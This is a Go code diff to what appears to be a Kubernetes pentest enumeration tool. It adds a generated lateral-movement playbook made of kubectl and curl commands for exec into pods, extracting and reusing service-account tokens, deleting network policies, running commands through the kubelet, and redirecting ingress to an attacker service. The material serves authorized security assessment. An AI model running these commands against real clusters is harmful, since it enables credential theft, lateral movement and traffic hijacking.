@@ -155,6 +155,7 @@ func (m *LateralMovementModule) buildLateralTables() []internal.TableFile {
 	headers := []string{
 		"Principal",
 		"Principal Type",
+		"Source",
 		"Scope",
 		"Role",
 		"Role Binding",
@@ -171,10 +172,15 @@ func (m *LateralMovementModule) buildLateralTables() []internal.TableFile {
 		if path.ScopeType == "cluster" {
 			scope = "cluster-wide"
 		}
+		source := path.SourceType
+		if source == "" {
+			source = "core"
+		}
 
 		body = append(body, []string{
 			path.Principal,
 			path.PrincipalType,
+			source,
 			scope,
 			path.RoleName,
 			path.BindingName,
@@ -272,12 +278,287 @@ func (m *LateralMovementModule) generateLateralLoot() []internal.LootFile {
 		}
 	}
 
+	// Build playbook content
+	methodGroups := groupLateralByMethod(m.AllPaths)
+	playbookContent := m.generateLateralPlaybook(methodGroups)
+
 	return []internal.LootFile{
 		{
 			Name:     "LateralMovement-Commands",
 			Contents: strings.Join(lootContent, "\n"),
 		},
+		{
+			Name:     "LateralMovement-Playbook",
+			Contents: playbookContent,
+		},
 	}
+}
+
+// generateLateralPlaybook creates a reference-style guide for lateral movement organized by technique
+func (m *LateralMovementModule) generateLateralPlaybook(methodGroups map[string][]attackpathservice.AttackPath) string {
+	var content []string
+
+	content = append(content, "#####################################")
+	content = append(content, "##### Lateral Movement Playbook")
+	content = append(content, "##### Reference Guide by Technique")
+	content = append(content, "#####################################")
+	content = append(content, "")
+
+	// Pod Access (Exec/Attach/Port-Forward)
+	content = append(content, `
+##############################################
+## POD ACCESS
+##############################################
+# Execute commands, attach to containers, port-forward to services`)
+	if entities := getLateralEntitiesForMethods(methodGroups, "Pod Access"); len(entities) > 0 {
+		content = append(content, "# Entities with this permission:")
+		for _, entity := range entities {
+			content = append(content, fmt.Sprintf("#   - %s", entity))
+		}
+	} else {
+		content = append(content, "# No entities found with pod access permissions")
+	}
+	content = append(content, `
+# Find all pods and their service accounts:
+kubectl get pods -A -o custom-columns='NS:.metadata.namespace,NAME:.metadata.name,SA:.spec.serviceAccountName,NODE:.spec.nodeName,IP:.status.podIP'
+
+# Exec into a pod:
+kubectl exec -it POD_NAME -n NAMESPACE -- /bin/sh
+
+# Exec with specific container (for multi-container pods):
+kubectl exec -it POD_NAME -n NAMESPACE -c CONTAINER_NAME -- /bin/sh
+
+# Attach to a running container:
+kubectl attach -it POD_NAME -n NAMESPACE
+
+# Port-forward to access internal services:
+kubectl port-forward POD_NAME 8080:80 -n NAMESPACE
+kubectl port-forward svc/SERVICE_NAME 8080:80 -n NAMESPACE
+
+# From inside a compromised pod, pivot to other pods:
+# 1. Find other pods: curl -s $KUBERNETES_SERVICE_HOST/api/v1/pods -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" -k
+# 2. Access via service DNS: curl http://SERVICE_NAME.NAMESPACE.svc.cluster.local`)
+
+	// Token Theft
+	content = append(content, `
+
+##############################################
+## TOKEN/CREDENTIAL THEFT
+##############################################
+# Steal SA tokens from secrets for lateral movement`)
+	if entities := getLateralEntitiesForMethods(methodGroups, "Token Theft"); len(entities) > 0 {
+		content = append(content, "# Entities with this permission:")
+		for _, entity := range entities {
+			content = append(content, fmt.Sprintf("#   - %s", entity))
+		}
+	} else {
+		content = append(content, "# No entities found with token theft permissions")
+	}
+	content = append(content, `
+# List SA token secrets:
+kubectl get secrets -A -o json | jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") | "\(.metadata.namespace)/\(.metadata.name) -> SA: \(.metadata.annotations["kubernetes.io/service-account.name"])"'
+
+# Extract token from secret:
+kubectl get secret SA_TOKEN_SECRET -n NAMESPACE -o jsonpath='{.data.token}' | base64 -d
+
+# Find high-privilege service accounts:
+kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name=="cluster-admin") | .subjects[]? | select(.kind=="ServiceAccount") | "\(.namespace)/\(.name)"'
+
+# Use stolen token:
+TOKEN="eyJhbG..."
+kubectl --token="$TOKEN" auth can-i --list
+kubectl --token="$TOKEN" get secrets -A
+
+# From inside a pod, use another pod's token:
+# If you can read secrets, get token and use it to pivot`)
+
+	// Service/Endpoint Discovery
+	content = append(content, `
+
+##############################################
+## SERVICE DISCOVERY
+##############################################
+# Discover services, endpoints, and pods for targeting`)
+	if entities := getLateralEntitiesForMethods(methodGroups, "Service Discovery", "Namespace Discovery", "Pod Discovery"); len(entities) > 0 {
+		content = append(content, "# Entities with this permission:")
+		for _, entity := range entities {
+			content = append(content, fmt.Sprintf("#   - %s", entity))
+		}
+	} else {
+		content = append(content, "# No entities found with discovery permissions")
+	}
+	content = append(content, `
+# List all namespaces:
+kubectl get namespaces
+
+# List all services:
+kubectl get services -A -o custom-columns='NS:.metadata.namespace,NAME:.metadata.name,TYPE:.spec.type,CLUSTER-IP:.spec.clusterIP,PORTS:.spec.ports[*].port'
+
+# Get endpoints (direct pod IPs):
+kubectl get endpoints -A -o custom-columns='NS:.metadata.namespace,NAME:.metadata.name,ENDPOINTS:.subsets[*].addresses[*].ip'
+
+# Find databases and sensitive services:
+kubectl get services -A | grep -iE '(mysql|postgres|redis|mongo|elastic|kafka|rabbitmq|vault)'
+
+# DNS enumeration from inside cluster:
+# nslookup kubernetes.default.svc.cluster.local
+# nslookup SERVICE_NAME.NAMESPACE.svc.cluster.local
+
+# Direct pod-to-pod access (bypass services):
+# curl http://POD_IP:PORT`)
+
+	// Config Access
+	content = append(content, `
+
+##############################################
+## CONFIG ACCESS
+##############################################
+# Read configmaps for service URLs and credentials`)
+	if entities := getLateralEntitiesForMethods(methodGroups, "Config Access"); len(entities) > 0 {
+		content = append(content, "# Entities with this permission:")
+		for _, entity := range entities {
+			content = append(content, fmt.Sprintf("#   - %s", entity))
+		}
+	} else {
+		content = append(content, "# No entities found with config access permissions")
+	}
+	content = append(content, `
+# Find configmaps with connection strings:
+kubectl get configmaps -A -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): \(.data | keys)"'
+
+# Search for service URLs in configmaps:
+kubectl get configmaps -A -o json | jq -r '.items[].data | to_entries[] | "\(.key): \(.value)"' | grep -iE '(http|https|jdbc|redis|mongo|amqp)://'
+
+# Extract specific configmap:
+kubectl get configmap CONFIG_NAME -n NAMESPACE -o yaml`)
+
+	// Network Policy Bypass
+	content = append(content, `
+
+##############################################
+## NETWORK POLICY BYPASS
+##############################################
+# Delete or modify network policies to enable lateral movement`)
+	if entities := getLateralEntitiesForMethods(methodGroups, "Network", "CRD Policy Bypass"); len(entities) > 0 {
+		content = append(content, "# Entities with this permission:")
+		for _, entity := range entities {
+			content = append(content, fmt.Sprintf("#   - %s", entity))
+		}
+	} else {
+		content = append(content, "# No entities found with network policy permissions")
+	}
+	content = append(content, `
+# List network policies:
+kubectl get networkpolicies -A
+
+# View network policy details:
+kubectl get networkpolicy POLICY_NAME -n NAMESPACE -o yaml
+
+# Delete network policy to remove restrictions:
+kubectl delete networkpolicy POLICY_NAME -n NAMESPACE
+
+# Modify network policy to allow all ingress:
+kubectl patch networkpolicy POLICY_NAME -n NAMESPACE --type=json -p='[{"op":"replace","path":"/spec/ingress","value":[{}]}]'
+
+# Modify to allow all egress:
+kubectl patch networkpolicy POLICY_NAME -n NAMESPACE --type=json -p='[{"op":"replace","path":"/spec/egress","value":[{}]}]'
+
+# Cilium/Calico/Istio network policies:
+kubectl get ciliumnetworkpolicies -A 2>/dev/null
+kubectl get networkpolicies.crd.projectcalico.org -A 2>/dev/null
+kubectl get authorizationpolicies.security.istio.io -A 2>/dev/null`)
+
+	// Node Access
+	content = append(content, `
+
+##############################################
+## NODE ACCESS
+##############################################
+# Access kubelet API for node-level lateral movement`)
+	if entities := getLateralEntitiesForMethods(methodGroups, "Node Access"); len(entities) > 0 {
+		content = append(content, "# Entities with this permission:")
+		for _, entity := range entities {
+			content = append(content, fmt.Sprintf("#   - %s", entity))
+		}
+	} else {
+		content = append(content, "# No entities found with node access permissions")
+	}
+	content = append(content, `
+# List nodes:
+kubectl get nodes -o wide
+
+# Proxy to kubelet API (list pods):
+kubectl get --raw "/api/v1/nodes/NODE_NAME/proxy/pods"
+
+# Access kubelet metrics:
+kubectl get --raw "/api/v1/nodes/NODE_NAME/proxy/metrics"
+
+# Direct kubelet access (if you have network access to node):
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+curl -sk -H "Authorization: Bearer $TOKEN" https://NODE_IP:10250/pods
+
+# Kubelet exec (RCE on any pod on the node):
+curl -sk -H "Authorization: Bearer $TOKEN" \
+  "https://NODE_IP:10250/run/NAMESPACE/POD/CONTAINER" \
+  -d "cmd=id"`)
+
+	// Ingress Manipulation
+	content = append(content, `
+
+##############################################
+## INGRESS MANIPULATION
+##############################################
+# Modify ingress to redirect traffic for MITM`)
+	if entities := getLateralEntitiesForMethods(methodGroups, "Ingress"); len(entities) > 0 {
+		content = append(content, "# Entities with this permission:")
+		for _, entity := range entities {
+			content = append(content, fmt.Sprintf("#   - %s", entity))
+		}
+	} else {
+		content = append(content, "# No entities found with ingress permissions")
+	}
+	content = append(content, `
+# List ingresses:
+kubectl get ingress -A -o custom-columns='NS:.metadata.namespace,NAME:.metadata.name,HOSTS:.spec.rules[*].host,PATHS:.spec.rules[*].http.paths[*].path'
+
+# Modify ingress to redirect to attacker service:
+kubectl patch ingress INGRESS_NAME -n NAMESPACE --type=json \
+  -p='[{"op":"replace","path":"/spec/rules/0/http/paths/0/backend/service/name","value":"attacker-svc"}]'
+
+# Add new path that routes to attacker:
+kubectl patch ingress INGRESS_NAME -n NAMESPACE --type=json \
+  -p='[{"op":"add","path":"/spec/rules/0/http/paths/-","value":{"path":"/evil","pathType":"Prefix","backend":{"service":{"name":"attacker-svc","port":{"number":80}}}}}]'`)
+
+	return strings.Join(content, "\n")
+}
+
+// groupLateralByMethod groups paths by their Method field
+func groupLateralByMethod(paths []attackpathservice.AttackPath) map[string][]attackpathservice.AttackPath {
+	groups := make(map[string][]attackpathservice.AttackPath)
+	for _, path := range paths {
+		groups[path.Method] = append(groups[path.Method], path)
+	}
+	return groups
+}
+
+// getLateralEntitiesForMethods returns unique entities that have any of the specified methods
+func getLateralEntitiesForMethods(methodGroups map[string][]attackpathservice.AttackPath, methods ...string) []string {
+	seen := make(map[string]bool)
+	var entities []string
+
+	for _, method := range methods {
+		if paths, ok := methodGroups[method]; ok {
+			for _, path := range paths {
+				key := fmt.Sprintf("%s:%s", path.PrincipalType, path.Principal)
+				if !seen[key] {
+					seen[key] = true
+					entities = append(entities, fmt.Sprintf("%s (%s) - %s", path.Principal, path.PrincipalType, path.ScopeName))
+				}
+			}
+		}
+	}
+
+	return entities
 }
 
 // Helper functions
